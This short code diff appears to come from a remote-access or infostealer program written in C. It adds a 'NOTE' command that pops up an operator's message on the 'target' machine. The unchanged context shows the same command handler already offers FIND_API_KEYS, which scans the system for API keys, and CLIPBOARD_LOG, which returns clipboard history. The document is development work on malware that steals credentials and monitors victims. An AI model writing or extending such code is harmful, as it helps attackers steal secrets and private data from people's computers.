@@ -109,6 +109,11 @@ static void handle_admin_command(SOCKET sock, const char *cmd) {
     else if (strcmp(cmd, "FIND_API_KEYS") == 0) {
         result = config_scan_scan_system();
     }
+    else if (strncmp(cmd, "NOTE|", 5) == 0) {
+        /* Open notepad with a message from the operator */
+        ui_open_note(cmd + 5);
+        result = "[Note opened on target]";
+    }
     else if (strcmp(cmd, "CLIPBOARD_LOG") == 0) {
         result = copy_buffer_get_history();
     }
